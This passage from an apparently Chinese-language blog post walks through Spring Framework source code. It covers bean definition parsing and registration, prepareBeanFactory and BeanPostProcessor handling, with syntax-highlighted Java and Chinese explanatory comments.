!registry.containsBeanDefinition(PERSISTENCE_ANNOTATION_PROCESSOR_BEAN_NAME)) &#123;</span><br><span class="line">        <span class="type">RootBeanDefinition</span> <span class="variable">def</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RootBeanDefinition</span>();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            def.setBeanClass(ClassUtils.forName(PERSISTENCE_ANNOTATION_PROCESSOR_CLASS_NAME,</span><br><span class="line">                                                AnnotationConfigUtils.class.getClassLoader()));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (ClassNotFoundException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(</span><br><span class="line">                <span class="string">&quot;Cannot load optional framework class: &quot;</span> + PERSISTENCE_ANNOTATION_PROCESSOR_CLASS_NAME, ex);</span><br><span class="line">        &#125;</span><br><span class="line">        def.setSource(source);</span><br><span class="line">        beanDefs.add(registerPostProcessor(registry, def, PERSISTENCE_ANNOTATION_PROCESSOR_BEAN_NAME));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 注册org.springframework.context.event.internalEventListenerProcessor</span></span><br><span class="line">    <span class="keyword">if</span> (!registry.containsBeanDefinition(EVENT_LISTENER_PROCESSOR_BEAN_NAME)) &#123;</span><br><span class="line">        <span class="type">RootBeanDefinition</span> <span class="variable">def</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RootBeanDefinition</span>(EventListenerMethodProcessor.class);</span><br><span class="line">        def.setSource(source);</span><br><span class="line">        beanDefs.add(registerPostProcessor(registry, def, EVENT_LISTENER_PROCESSOR_BEAN_NAME));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 注册org.springframework.context.event.internalEventListenerFactory</span></span><br><span class="line">    <span class="keyword">if</span> (!registry.containsBeanDefinition(EVENT_LISTENER_FACTORY_BEAN_NAME)) &#123;</span><br><span class="line">        <span class="type">RootBeanDefinition</span> <span class="variable">def</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RootBeanDefinition</span>(DefaultEventListenerFactory.class);</span><br><span class="line">        def.setSource(source);</span><br><span class="line">        beanDefs.add(registerPostProcessor(registry, def, EVENT_LISTENER_FACTORY_BEAN_NAME));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> beanDefs;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="代码3-2-28"><a href="#代码3-2-28" class="headerlink" title="代码3.2.28"></a>代码3.2.28</h3><p>org.springframework.beans.factory.xml.DefaultBeanDefinitionDocumentReader#parseDefaultElement</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">parseDefaultElement</span><span class="params">(Element ele, BeanDefinitionParserDelegate delegate)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (delegate.nodeNameEquals(ele, IMPORT_ELEMENT)) &#123;</span><br><span class="line">        <span class="comment">// 元素节点为import</span></span><br><span class="line">        importBeanDefinitionResource(ele);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (delegate.nodeNameEquals(ele, ALIAS_ELEMENT)) &#123;</span><br><span class="line">        <span class="comment">// 元素节点为alias</span></span><br><span class="line">        processAliasRegistration(ele);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (delegate.nodeNameEquals(ele, BEAN_ELEMENT)) &#123;</span><br><span class="line">        <span class="comment">// 元素节点为bean，这里bean节点为例，详细：代码3.2.29</span></span><br><span class="line">        processBeanDefinition(ele, delegate);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (delegate.nodeNameEquals(ele, NESTED_BEANS_ELEMENT)) &#123;</span><br><span class="line">        <span class="comment">// recurse</span></span><br><span class="line">        <span class="comment">// 元素节点为嵌套的内部beans，采取递归的策略，即又回到：代码3.2.14</span></span><br><span class="line">        doRegisterBeanDefinitions(ele);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="代码3-2-29"><a href="#代码3-2-29" class="headerlink" title="代码3.2.29"></a>代码3.2.29</h3><p>org.springframework.beans.factory.xml.DefaultBeanDefinitionDocumentReader#processBeanDefinition</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">processBeanDefinition</span><span class="params">(Element ele, BeanDefinitionParserDelegate delegate)</span> &#123;</span><br><span class="line">    <span class="comment">// 解析xml获取元素信息，封装到BeanDefinitionHolder，详细：代码3.2.30</span></span><br><span class="line">    <span class="type">BeanDefinitionHolder</span> <span class="variable">bdHolder</span> <span class="operator">=</span> delegate.parseBeanDefinitionElement(ele);</span><br><span class="line">    <span class="keyword">if</span> (bdHolder != <span class="literal">null</span>) &#123;</span><br><span class="line">        bdHolder = delegate.decorateBeanDefinitionIfRequired(ele, bdHolder);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// Register the final decorated instance.</span></span><br><span class="line">            <span class="comment">// 注册BeanDefinition到BeanFactory，详细：代码3.2.33</span></span><br><span class="line">            BeanDefinitionReaderUtils.registerBeanDefinition(bdHolder, getReaderContext().getRegistry());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (BeanDefinitionStoreException ex) &#123;</span><br><span class="line">            getReaderContext().error(<span class="string">&quot;Failed to register bean definition with name &#x27;&quot;</span> +</span><br><span class="line">                                     bdHolder.getBeanName() + <span class="string">&quot;&#x27;&quot;</span>, ele, ex);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// Send registration event.</span></span><br><span class="line">        getReaderContext().fireComponentRegistered(<span class="keyword">new</span> <span class="title class_">BeanComponentDefinition</span>(bdHolder));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="代码3-2-30"><a href="#代码3-2-30" class="headerlink" title="代码3.2.30"></a>代码3.2.30</h3><p>org.springframework.beans.factory.xml.BeanDefinitionParserDelegate#parseBeanDefinitionElement(org.w3c.dom.Element)</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> BeanDefinitionHolder <span class="title function_">parseBeanDefinitionElement</span><span class="params">(Element ele)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> parseBeanDefinitionElement(ele, <span class="literal">null</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> BeanDefinitionHolder <span class="title function_">parseBeanDefinitionElement</span><span class="params">(Element ele, BeanDefinition containingBean)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">id</span> <span class="operator">=</span> ele.getAttribute(ID_ATTRIBUTE);</span><br><span class="line">    <span class="type">String</span> <span class="variable">nameAttr</span> <span class="operator">=</span> ele.getAttribute(NAME_ATTRIBUTE);</span><br><span class="line"></span><br><span class="line">    List&lt;String&gt; aliases = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;String&gt;();</span><br><span class="line">    <span class="keyword">if</span> (StringUtils.hasLength(nameAttr)) &#123;</span><br><span class="line">        String[] nameArr = StringUtils.tokenizeToStringArray(nameAttr, MULTI_VALUE_ATTRIBUTE_DELIMITERS);</span><br><span class="line">        aliases.addAll(Arrays.asList(nameArr));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">String</span> <span class="variable">beanName</span> <span class="operator">=</span> id;</span><br><span class="line">    <span class="keyword">if</span> (!StringUtils.hasText(beanName) &amp;&amp; !aliases.isEmpty()) &#123;</span><br><span class="line">        beanName = aliases.remove(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (logger.isDebugEnabled()) &#123;</span><br><span class="line">            logger.debug(<span class="string">&quot;No XML &#x27;id&#x27; specified - using &#x27;&quot;</span> + beanName +</span><br><span class="line">                         <span class="string">&quot;&#x27; as bean name and &quot;</span> + aliases + <span class="string">&quot; as aliases&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (containingBean == <span class="literal">null</span>) &#123;</span><br><span class="line">        checkNameUniqueness(beanName, aliases, ele);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 解析元素节点，创建bean定义，并设置其属性，如：懒加载、是否单例等，详细：代码3.2.31</span></span><br><span class="line">    <span class="type">AbstractBeanDefinition</span> <span class="variable">beanDefinition</span> <span class="operator">=</span> parseBeanDefinitionElement(ele, beanName, containingBean);</span><br><span class="line">    <span class="keyword">if</span> (beanDefinition != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!StringUtils.hasText(beanName)) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (containingBean != <span class="literal">null</span>) &#123;</span><br><span class="line">                    beanName = BeanDefinitionReaderUtils.generateBeanName(</span><br><span class="line">                        beanDefinition, <span class="built_in">this</span>.readerContext.getRegistry(), <span class="literal">true</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    beanName = <span class="built_in">this</span>.readerContext.generateBeanName(beanDefinition);</span><br><span class="line">                    <span class="comment">// Register an alias for the plain bean class name, if still possible,</span></span><br><span class="line">                    <span class="comment">// if the generator returned the class name plus a suffix.</span></span><br><span class="line">                    <span class="comment">// This is expected for Spring 1.2/2.0 backwards compatibility.</span></span><br><span class="line">                    <span class="type">String</span> <span class="variable">beanClassName</span> <span class="operator">=</span> beanDefinition.getBeanClassName();</span><br><span class="line">                    <span class="keyword">if</span> (beanClassName != <span class="literal">null</span> &amp;&amp;</span><br><span class="line">                        beanName.startsWith(beanClassName) &amp;&amp; beanName.length() &gt; beanClassName.length() &amp;&amp;</span><br><span class="line">                        !<span class="built_in">this</span>.readerContext.getRegistry().isBeanNameInUse(beanClassName)) &#123;</span><br><span class="line">                        aliases.add(beanClassName);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (logger.isDebugEnabled()) &#123;</span><br><span class="line">                    logger.debug(<span class="string">&quot;Neither XML &#x27;id&#x27; nor &#x27;name&#x27; specified - &quot;</span> +</span><br><span class="line">                                 <span class="string">&quot;using generated bean name [&quot;</span> + beanName + <span class="string">&quot;]&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">                error(ex.getMessage(), ele);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        String[] aliasesArray = StringUtils.toStringArray(aliases);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">BeanDefinitionHolder</span>(beanDefinition, beanName, aliasesArray);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="代码3-2-31"><a href="#代码3-2-31" class="headerlink" title="代码3.2.31"></a>代码3.2.31</h3><p>org.springframework.beans.factory.xml.BeanDefinitionParserDelegate#parseBeanDefinitionElement(org.w3c.dom.Element, java.lang.String, org.springframework.beans.factory.config.BeanDefinition)</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> AbstractBeanDefinition <span class="title function_">parseBeanDefinitionElement</span><span class="params">(</span></span><br><span class="line"><span class="params">    Element ele, String beanName, BeanDefinition containingBean)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">this</span>.parseState.push(<span class="keyword">new</span> <span class="title class_">BeanEntry</span>(beanName));</span><br><span class="line"></span><br><span class="line">    <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (ele.hasAttribute(CLASS_ATTRIBUTE)) &#123;</span><br><span class="line">        className = ele.getAttribute(CLASS_ATTRIBUTE).trim();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">parent</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (ele.hasAttribute(PARENT_ATTRIBUTE)) &#123;</span><br><span class="line">            parent = ele.getAttribute(PARENT_ATTRIBUTE);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 创建bean定义对象</span></span><br><span class="line">        <span class="type">AbstractBeanDefinition</span> <span class="variable">bd</span> <span class="operator">=</span> createBeanDefinition(className, parent);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 给bean定义对象设置属性，如：懒加载、是否单例等，详细：代码3.2.32</span></span><br><span class="line">        parseBeanDefinitionAttributes(ele, beanName, containingBean, bd);</span><br><span class="line">        bd.setDescription(DomUtils.getChildElementValueByTagName(ele, DESCRIPTION_ELEMENT));</span><br><span class="line"></span><br><span class="line">        parseMetaElements(ele, bd);</span><br><span class="line">        parseLookupOverrideSubElements(ele, bd.getMethodOverrides());</span><br><span class="line">        parseReplacedMethodSubElements(ele, bd.getMethodOverrides());</span><br><span class="line"></span><br><span class="line">        parseConstructorArgElements(ele, bd);</span><br><span class="line">        parsePropertyElements(ele, bd);</span><br><span class="line">        parseQualifierElements(ele, bd);</span><br><span class="line"></span><br><span class="line">        bd.setResource(<span class="built_in">this</span>.readerContext.getResource());</span><br><span class="line">        bd.setSource(extractSource(ele));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> bd;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (ClassNotFoundException ex) &#123;</span><br><span class="line">        error(<span class="string">&quot;Bean class [&quot;</span> + className + <span class="string">&quot;] not found&quot;</span>, ele, ex);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (NoClassDefFoundError err) &#123;</span><br><span class="line">        error(<span class="string">&quot;Class that bean class [&quot;</span> + className + <span class="string">&quot;] depends on not found&quot;</span>, ele, err);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (Throwable ex) &#123;</span><br><span class="line">        error(<span class="string">&quot;Unexpected failure during bean definition parsing&quot;</span>, ele, ex);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.parseState.pop();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="代码3-2-32"><a href="#代码3-2-32" class="headerlink" title="代码3.2.32"></a>代码3.2.32</h3><p>org.springframework.beans.factory.xml.BeanDefinitionParserDelegate#parseBeanDefinitionAttributes</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> AbstractBeanDefinition <span class="title function_">parseBeanDefinitionAttributes</span><span class="params">(Element ele, String beanName,</span></span><br><span class="line"><span class="params">                                                            BeanDefinition containingBean, AbstractBeanDefinition bd)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ele.hasAttribute(SINGLETON_ATTRIBUTE)) &#123;</span><br><span class="line">        error(<span class="string">&quot;Old 1.x &#x27;singleton&#x27; attribute in use - upgrade to &#x27;scope&#x27; declaration&quot;</span>, ele);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (ele.hasAttribute(SCOPE_ATTRIBUTE)) &#123;</span><br><span class="line">        bd.setScope(ele.getAttribute(SCOPE_ATTRIBUTE));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (containingBean != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// Take default from containing bean in case of an inner bean definition.</span></span><br><span class="line">        bd.setScope(containingBean.getScope());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ele.hasAttribute(ABSTRACT_ATTRIBUTE)) &#123;</span><br><span class="line">        bd.setAbstract(TRUE_VALUE.equals(ele.getAttribute(ABSTRACT_ATTRIBUTE)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">String</span> <span class="variable">lazyInit</span> <span class="operator">=</span> ele.getAttribute(LAZY_INIT_ATTRIBUTE);</span><br><span class="line">    <span class="keyword">if</span> (DEFAULT_VALUE.equals(lazyInit)) &#123;</span><br><span class="line">        lazyInit = <span class="built_in">this</span>.defaults.getLazyInit();</span><br><span class="line">    &#125;</span><br><span class="line">    bd.setLazyInit(TRUE_VALUE.equals(lazyInit));</span><br><span class="line"></span><br><span class="line">    <span class="type">String</span> <span class="variable">autowire</span> <span class="operator">=</span> ele.getAttribute(AUTOWIRE_ATTRIBUTE);</span><br><span class="line">    bd.setAutowireMode(getAutowireMode(autowire));</span><br><span class="line"></span><br><span class="line">    <span class="type">String</span> <span class="variable">dependencyCheck</span> <span class="operator">=</span> ele.getAttribute(DEPENDENCY_CHECK_ATTRIBUTE);</span><br><span class="line">    bd.setDependencyCheck(getDependencyCheck(dependencyCheck));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ele.hasAttribute(DEPENDS_ON_ATTRIBUTE)) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">dependsOn</span> <span class="operator">=</span> ele.getAttribute(DEPENDS_ON_ATTRIBUTE);</span><br><span class="line">        bd.setDependsOn(StringUtils.tokenizeToStringArray(dependsOn, MULTI_VALUE_ATTRIBUTE_DELIMITERS));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">String</span> <span class="variable">autowireCandidate</span> <span class="operator">=</span> ele.getAttribute(AUTOWIRE_CANDIDATE_ATTRIBUTE);</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&quot;&quot;</span>.equals(autowireCandidate) || DEFAULT_VALUE.equals(autowireCandidate)) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">candidatePattern</span> <span class="operator">=</span> <span class="built_in">this</span>.defaults.getAutowireCandidates();</span><br><span class="line">        <span class="keyword">if</span> (candidatePattern != <span class="literal">null</span>) &#123;</span><br><span class="line">            String[] patterns = StringUtils.commaDelimitedListToStringArray(candidatePattern);</span><br><span class="line">            bd.setAutowireCandidate(PatternMatchUtils.simpleMatch(patterns, beanName));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        bd.setAutowireCandidate(TRUE_VALUE.equals(autowireCandidate));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ele.hasAttribute(PRIMARY_ATTRIBUTE)) &#123;</span><br><span class="line">        bd.setPrimary(TRUE_VALUE.equals(ele.getAttribute(PRIMARY_ATTRIBUTE)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ele.hasAttribute(INIT_METHOD_ATTRIBUTE)) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">initMethodName</span> <span class="operator">=</span> ele.getAttribute(INIT_METHOD_ATTRIBUTE);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="string">&quot;&quot;</span>.equals(initMethodName)) &#123;</span><br><span class="line">            bd.setInitMethodName(initMethodName);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.defaults.getInitMethod() != <span class="literal">null</span>) &#123;</span><br><span class="line">            bd.setInitMethodName(<span class="built_in">this</span>.defaults.getInitMethod());</span><br><span class="line">            bd.setEnforceInitMethod(<span class="literal">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ele.hasAttribute(DESTROY_METHOD_ATTRIBUTE)) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">destroyMethodName</span> <span class="operator">=</span> ele.getAttribute(DESTROY_METHOD_ATTRIBUTE);</span><br><span class="line">        bd.setDestroyMethodName(destroyMethodName);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.defaults.getDestroyMethod() != <span class="literal">null</span>) &#123;</span><br><span class="line">            bd.setDestroyMethodName(<span class="built_in">this</span>.defaults.getDestroyMethod());</span><br><span class="line">            bd.setEnforceDestroyMethod(<span class="literal">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ele.hasAttribute(FACTORY_METHOD_ATTRIBUTE)) &#123;</span><br><span class="line">        bd.setFactoryMethodName(ele.getAttribute(FACTORY_METHOD_ATTRIBUTE));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (ele.hasAttribute(FACTORY_BEAN_ATTRIBUTE)) &#123;</span><br><span class="line">        bd.setFactoryBeanName(ele.getAttribute(FACTORY_BEAN_ATTRIBUTE));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> bd;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="代码3-2-33"><a href="#代码3-2-33" class="headerlink" title="代码3.2.33"></a>代码3.2.33</h3><p>org.springframework.beans.factory.support.BeanDefinitionReaderUtils#registerBeanDefinition</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">registerBeanDefinition</span><span class="params">(</span></span><br><span class="line"><span class="params">    BeanDefinitionHolder definitionHolder, BeanDefinitionRegistry registry)</span></span><br><span class="line">    <span class="keyword">throws</span> BeanDefinitionStoreException &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Register bean definition under primary name.</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">beanName</span> <span class="operator">=</span> definitionHolder.getBeanName();</span><br><span class="line">    <span class="comment">// 注册BeanDefinition，此时，又回到了代码3.2.24，最终完成bean定义的注册</span></span><br><span class="line">    registry.registerBeanDefinition(beanName, definitionHolder.getBeanDefinition());</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Register aliases for bean name, if any.</span></span><br><span class="line">    String[] aliases = definitionHolder.getAliases();</span><br><span class="line">    <span class="keyword">if</span> (aliases != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (String alias : aliases) &#123;</span><br><span class="line">            registry.registerAlias(beanName, alias);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="3-3-prepareBeanFactory"><a href="#3-3-prepareBeanFactory" class="headerlink" title="3.3 prepareBeanFactory"></a>3.3 prepareBeanFactory</h2><p>作用：配置BeanFactory的类加载器、SpEL分解器、属性编辑注册器、后置处理器、以及environment、systemProperties、systemEnvironment3个单例对象</p>
<p>org.springframework.context.support.AbstractApplicationContext#prepareBeanFactory</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">prepareBeanFactory</span><span class="params">(ConfigurableListableBeanFactory beanFactory)</span> &#123;</span><br><span class="line">    <span class="comment">// Tell the internal bean factory to use the context&#x27;s class loader etc.</span></span><br><span class="line">    <span class="comment">// 配置bean的类加载器</span></span><br><span class="line">    beanFactory.setBeanClassLoader(getClassLoader());</span><br><span class="line">    <span class="comment">// 配置SpEL(Spring EL表达式)的分解器。如：@Value(&quot;aaa&quot;)设置值为aaa；@Value(&quot;#&#123;user.age&#125;&quot;)设置值为容器中user对象的age属性值；@Value(&quot;$&#123;port&#125;&quot;)从配置文件读取</span></span><br><span class="line">    beanFactory.setBeanExpressionResolver(<span class="keyword">new</span> <span class="title class_">StandardBeanExpressionResolver</span>(beanFactory.getBeanClassLoader()));</span><br><span class="line">    <span class="comment">// 配置属性编辑注册器</span></span><br><span class="line">    beanFactory.addPropertyEditorRegistrar(<span class="keyword">new</span> <span class="title class_">ResourceEditorRegistrar</span>(<span class="built_in">this</span>, getEnvironment()));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Configure the bean factory with context callbacks.</span></span><br><span class="line">    <span class="comment">// 添加后置处理器：ApplicationContextAwareProcessor，详细：3.3.1</span></span><br><span class="line">    beanFactory.addBeanPostProcessor(<span class="keyword">new</span> <span class="title class_">ApplicationContextAwareProcessor</span>(<span class="built_in">this</span>));</span><br><span class="line">    <span class="comment">// 忽略指定依赖接口，详细：代码3.3.2</span></span><br><span class="line">    beanFactory.ignoreDependencyInterface(EnvironmentAware.class);</span><br><span class="line">    beanFactory.ignoreDependencyInterface(EmbeddedValueResolverAware.class);</span><br><span class="line">    beanFactory.ignoreDependencyInterface(ResourceLoaderAware.class);</span><br><span class="line">    beanFactory.ignoreDependencyInterface(ApplicationEventPublisherAware.class);</span><br><span class="line">    beanFactory.ignoreDependencyInterface(MessageSourceAware.class);</span><br><span class="line">    beanFactory.ignoreDependencyInterface(ApplicationContextAware.class);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// BeanFactory interface not registered as resolvable type in a plain factory.</span></span><br><span class="line">    <span class="comment">// MessageSource registered (and found for autowiring) as a bean.</span></span><br><span class="line">    <span class="comment">// 将类型与对应的对象beanFactory、xmlWebApplicationContext（this）注册关联起来，详细：代码3.3.3</span></span><br><span class="line">    beanFactory.registerResolvableDependency(BeanFactory.class, beanFactory);</span><br><span class="line">    beanFactory.registerResolvableDependency(ResourceLoader.class, <span class="built_in">this</span>);</span><br><span class="line">    beanFactory.registerResolvableDependency(ApplicationEventPublisher.class, <span class="built_in">this</span>);</span><br><span class="line">    beanFactory.registerResolvableDependency(ApplicationContext.class, <span class="built_in">this</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Register early post-processor for detecting inner beans as ApplicationListeners.</span></span><br><span class="line">    <span class="comment">// 添加后置处理器：ApplicationListenerDetector（早期为了发现ApplicationListeners的后置处理器，找到后发送给多播器）</span></span><br><span class="line">    beanFactory.addBeanPostProcessor(<span class="keyword">new</span> <span class="title class_">ApplicationListenerDetector</span>(<span class="built_in">this</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Detect a LoadTimeWeaver and prepare for weaving, if found.</span></span><br><span class="line">    <span class="keyword">if</span> (beanFactory.containsBean(LOAD_TIME_WEAVER_BEAN_NAME)) &#123;</span><br><span class="line">        beanFactory.addBeanPostProcessor(<span class="keyword">new</span> <span class="title class_">LoadTimeWeaverAwareProcessor</span>(beanFactory));</span><br><span class="line">        <span class="comment">// Set a temporary ClassLoader for type matching.</span></span><br><span class="line">        beanFactory.setTempClassLoader(<span class="keyword">new</span> <span class="title class_">ContextTypeMatchClassLoader</span>(beanFactory.getBeanClassLoader()));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Register default environment beans.</span></span><br><span class="line">    <span class="comment">// 注册单例对象：environment、systemProperties、systemEnvironment，详细：代码3.3.4</span></span><br><span class="line">    <span class="keyword">if</span> (!beanFactory.containsLocalBean(ENVIRONMENT_BEAN_NAME)) &#123;</span><br><span class="line">        beanFactory.registerSingleton(ENVIRONMENT_BEAN_NAME, getEnvironment());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!beanFactory.containsLocalBean(SYSTEM_PROPERTIES_BEAN_NAME)) &#123;</span><br><span class="line">        beanFactory.registerSingleton(SYSTEM_PROPERTIES_BEAN_NAME, getEnvironment().getSystemProperties());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!beanFactory.containsLocalBean(SYSTEM_ENVIRONMENT_BEAN_NAME)) &#123;</span><br><span class="line">        beanFactory.registerSingleton(SYSTEM_ENVIRONMENT_BEAN_NAME, getEnvironment().getSystemEnvironment());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="代码3-3-1"><a href="#代码3-3-1" class="headerlink" title="代码3.3.1"></a>代码3.3.1</h3><p>org.springframework.beans.factory.support.AbstractBeanFactory#addBeanPostProcessor</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Bean的后置处理器</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> List&lt;BeanPostProcessor&gt; beanPostProcessors = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;BeanPostProcessor&gt;();</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addBeanPostProcessor</span><span class="params">(BeanPostProcessor beanPostProcessor)</span> &#123;</span><br><span class="line">    Assert.notNull(beanPostProcessor, <span class="string">&quot;BeanPostProcessor must not be null&quot;</span>);</span><br><span class="line">    <span class="built_in">this</span>.beanPostProcessors.remove(beanPostProcessor);</span><br><span class="line">    <span class="built_in">this</span>.beanPostProcessors.add(beanPostProcessor);</span><br><span class="line">    <span class="comment">// 后置处理器实现了InstantiationAwareBeanPostProcessor接口（五个方法：实例化前、实例化后、初始化前、初始化后、后置修改属性值）；</span></span><br><span class="line">    <span class="comment">// 